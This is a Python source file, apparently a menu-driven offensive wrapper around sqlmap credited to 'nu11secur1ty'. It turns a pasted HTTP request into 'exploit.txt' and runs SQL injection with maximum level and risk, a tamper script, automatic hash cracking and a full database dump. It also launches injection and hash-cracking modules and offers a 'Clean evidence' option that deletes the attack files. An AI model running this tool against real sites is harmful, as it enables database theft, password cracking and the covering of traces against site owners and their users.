#!/usr/bin/env python3
# G0BurpSQLmaPI (polished) by nu11secur1ty ‚Äî 2023‚Äì2025 (polish 2025)
# - Saves vuln params to modules/exploit_meta.json
# - Writes a comment header in exploit.txt with the vuln params
# - Uses subprocess.run for external commands (safer)
# - Better menu numbering and messages
# - Graceful KeyboardInterrupt handling

import os
import sys
import json
import time
import shutil
import subprocess
from pathlib import Path

try:
    from colorama import init, Fore, Style
    init(autoreset=True, convert=True)
except Exception:
    # Fallback if colorama not available ‚Äî keep script usable
    class Dummy:
        def __getattr__(self, _):
            return ""
    Fore = Style = Dummy()

ROOT = Path.cwd()
MODULES_DIR = ROOT / "modules"
EXPLOIT_PATH = ROOT / "exploit.txt"
MODULES_EXPLOIT_PATH = MODULES_DIR / "exploit.txt"
META_PATH = MODULES_DIR / "exploit_meta.json"

# Default sqlmap path - adjust or set env variable G0_SQLMAP_PATH to override
DEFAULT_SQLMAP_ENV = "G0_SQLMAP_PATH"
DEFAULT_SQLMAP_REL = Path("D:/CVE/sqlmap-nu11secur1ty/sqlmap.py")  # keep as fallback

def ensure_modules_dir():
    MODULES_DIR.mkdir(parents=True, exist_ok=True)

def display_menu():
    print(Fore.CYAN + "\n===== G0BurpSQLmaPI Menu =====\n" + Style.RESET_ALL)
    print("1. Generate PoC (exploit.txt)")
    print("2. Start sqlmap with PoC")
    print("3. Run module: modules/URLi.py")
    print("4. Run module: modules/User-Agent.py")
    print("5. Run module: modules/HashCracker.py")
    print("6. Clean evidence (delete exploit.txt and metadata)")
    print("7. Exit\n")

def input_multiline(prompt=None):
    if prompt:
        print(prompt)
    print("(Enter a single dot '.' on its own line to finish, or type 'exit' to cancel.)")
    lines = []
    while True:
        try:
            line = input()
        except KeyboardInterrupt:
            print(Fore.RED + "\nInterrupted during input. Cancelled." + Style.RESET_ALL)
            return None
        if line.lower().strip() == "exit":
            return None
        if line.strip() == ".":
            break
        lines.append(line)
    return "\n".join(lines).rstrip("\n")

def create_exploit_file():
    ensure_modules_dir()
    payload = input_multiline(Fore.GREEN + "Paste your full POST or GET request below (must start with POST or GET).")
    if payload is None:
        print(Fore.YELLOW + "Cancelled PoC creation, returning to menu..." + Style.RESET_ALL)
        return

    if not payload.strip():
        print(Fore.RED + "‚ùå ERROR: Empty payload. Returning to menu..." + Style.RESET_ALL)
        return

    first_line = payload.strip().splitlines()[0].upper()
    if not (first_line.startswith("POST") or first_line.startswith("GET")):
        print(Fore.RED + "‚ùå ERROR: Payload must start with POST or GET. Returning to menu..." + Style.RESET_ALL)
        return

    vuln_params = input(Fore.CYAN + "Enter vulnerable parameter(s) (comma separated if multiple): " + Style.RESET_ALL).strip()
    if not vuln_params:
        print(Fore.YELLOW + "No vulnerable parameter provided. You can add them later. Saving payload without params..." + Style.RESET_ALL)
        vuln_params_list = []
    else:
        vuln_params_list = [p.strip() for p in vuln_params.split(",") if p.strip()]

    # Save payload to files with a comment header mentioning vuln params (if any)
    header_lines = []
    if vuln_params_list:
        header_lines.append(f"# VULN_PARAMS: {','.join(vuln_params_list)}")
    header_lines.append("# Generated by G0BurpSQLmaPI")
    header = "\n".join(header_lines) + "\n\n"

    try:
        EXPLOIT_PATH.write_text(header + payload, encoding="utf-8")
        MODULES_EXPLOIT_PATH.write_text(header + payload, encoding="utf-8")
        print(Fore.GREEN + f"‚úÖ PoC saved to '{EXPLOIT_PATH}' and '{MODULES_EXPLOIT_PATH}'" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"‚ùå Failed to write exploit files: {e}" + Style.RESET_ALL)
        return

    # Save metadata JSON so other functions (like run_sqlmap) can read the params
    meta = {"vuln_params": vuln_params_list, "created_at": time.strftime("%Y-%m-%dT%H:%M:%S")}
    try:
        META_PATH.write_text(json.dumps(meta, indent=2), encoding="utf-8")
        print(Fore.GREEN + f"üîí Metadata saved to '{META_PATH}'" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.YELLOW + f"‚ö†Ô∏è Failed to save metadata file: {e}" + Style.RESET_ALL)

def find_sqlmap():
    # Priority:
    # 1) environment variable G0_SQLMAP_PATH
    # 2) DEFAULT_SQLMAP_REL if it exists
    # 3) 'sqlmap.py' or 'sqlmap' on PATH (via shutil.which)
    env_path = os.getenv(DEFAULT_SQLMAP_ENV)
    if env_path:
        p = Path(env_path)
        if p.exists():
            return str(p)
    if DEFAULT_SQLMAP_REL.exists():
        return str(DEFAULT_SQLMAP_REL)
    # check PATH for python script or executable
    for candidate in ("sqlmap.py", "sqlmap"):
        found = shutil.which(candidate)
        if found:
            return found
    return None

def run_sqlmap():
    ensure_modules_dir()
    if not MODULES_EXPLOIT_PATH.exists():
        print(Fore.RED + f"‚ùå ERROR: '{MODULES_EXPLOIT_PATH}' not found. Please generate PoC first." + Style.RESET_ALL)
        return

    sqlmap_path = find_sqlmap()
    if not sqlmap_path:
        print(Fore.RED + "‚ùå ERROR: sqlmap not found. Please install sqlmap or set the environment variable "
                         f"'{DEFAULT_SQLMAP_ENV}' to the sqlmap path." + Style.RESET_ALL)
        return

    # load vuln params from metadata if present
    params_flag = []
    if META_PATH.exists():
        try:
            meta = json.loads(META_PATH.read_text(encoding="utf-8"))
            vuln_params = meta.get("vuln_params") or []
            if vuln_params:
                params_flag = ["-p", ",".join(vuln_params)]
                print(Fore.GREEN + f"[+] Using vulnerable params for sqlmap: {vuln_params}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.YELLOW + f"‚ö†Ô∏è Could not read metadata file: {e}" + Style.RESET_ALL)

    # base sqlmap args (adjustable)
    base_args = [
        sys.executable if sqlmap_path.endswith(".py") else sqlmap_path,
        sqlmap_path if not sqlmap_path.endswith(".py") else sqlmap_path  # we will call with python if it's a .py
    ]
    # Build command in a safe list form
    cmd = []
    if sqlmap_path.endswith(".py"):
        cmd = [sys.executable, sqlmap_path]
    else:
        cmd = [sqlmap_path]

    cmd += ["-r", str(MODULES_EXPLOIT_PATH)]
    cmd += params_flag
    cmd += [
        "--tamper=space2comment",
        "--dbms=mysql",
        "--time-sec=11",
        "--random-agent",
        "--level=5",
        "--risk=3",
        "--batch",
        "--flush-session",
        "--technique=BEUS",
        "--union-char=UCHAR",
        '--answers=crack=Y,dict=Y,continue=Y,quit=N',
        "--dump",
    ]

    # Filter out possible empty strings
    cmd = [c for c in cmd if c]

    print(Fore.YELLOW + "\n[+] Starting sqlmap with your exploit file (this will stream output)...\n" + Style.RESET_ALL)
    try:
        # Use subprocess.run so we don't leave a shell open, and allow user to see sqlmap output directly
        subprocess.run(cmd, check=False)
    except KeyboardInterrupt:
        print(Fore.RED + "\nInterrupted sqlmap run by user." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"‚ùå Failed to start sqlmap: {e}" + Style.RESET_ALL)
    finally:
        print(Fore.RED + "\nHappy hunting with nu11secur1ty =)\n" + Style.RESET_ALL)

def run_module(module_filename):
    ensure_modules_dir()
    module_path = MODULES_DIR / module_filename
    if not module_path.exists():
        print(Fore.RED + f"‚ùå ERROR: Module '{module_path}' not found." + Style.RESET_ALL)
        return
    print(Fore.YELLOW + f"\n[+] Running module {module_path}...\n" + Style.RESET_ALL)
    try:
        # call module with same Python interpreter
        subprocess.run([sys.executable, str(module_path)], check=False)
    except KeyboardInterrupt:
        print(Fore.RED + "\nInterrupted module run by user." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"‚ùå Failed to run module: {e}" + Style.RESET_ALL)
    finally:
        print(Fore.RED + "\nModule finished. Happy hunting =)\n" + Style.RESET_ALL)

def clean_up():
    deleted_any = False
    for path in (EXPLOIT_PATH, MODULES_EXPLOIT_PATH, META_PATH):
        if path.exists():
            try:
                path.unlink()
                print(Fore.GREEN + f"üßπ Deleted: {path}" + Style.RESET_ALL)
                deleted_any = True
            except Exception as e:
                print(Fore.RED + f"‚ùå ERROR deleting '{path}': {e}" + Style.RESET_ALL)
    # Try to remove modules dir if empty
    try:
        if MODULES_DIR.exists() and not any(MODULES_DIR.iterdir()):
            MODULES_DIR.rmdir()
    except Exception:
        pass

    if not deleted_any:
        print(Fore.YELLOW + "‚ö†Ô∏è No exploit files or metadata found to delete." + Style.RESET_ALL)

def main():
    valid_choices = {str(i) for i in range(1, 8)}

    try:
        while True:
            display_menu()
            try:
                choice = input(Fore.YELLOW + "Enter your choice: " + Style.RESET_ALL).strip()
            except EOFError:
                print(Fore.RED + "\nEOF, exiting." + Style.RESET_ALL)
                break

            if choice not in valid_choices:
                print(Fore.RED + "‚ùå Invalid choice. Please enter a valid menu option number." + Style.RESET_ALL)
                time.sleep(0.5)
                continue

            if choice == '1':
                create_exploit_file()
            elif choice == '2':
                run_sqlmap()
            elif choice == '3':
                run_module("URLi.py")
            elif choice == '4':
                run_module("User-Agent.py")
            elif choice == '5':
                run_module("HashCracker.py")
            elif choice == '6':
                clean_up()
            elif choice == '7':
                print(Fore.GREEN + "Exiting... Happy hunting ‚ò†Ô∏è" + Style.RESET_ALL)
                break

            # small pause so the menu doesn't instantly reprint over output
            time.sleep(0.6)

    except KeyboardInterrupt:
        print(Fore.RED + "\nInterrupted. Exiting cleanly." + Style.RESET_ALL)
        sys.exit(0)

if __name__ == "__main__":
    main()
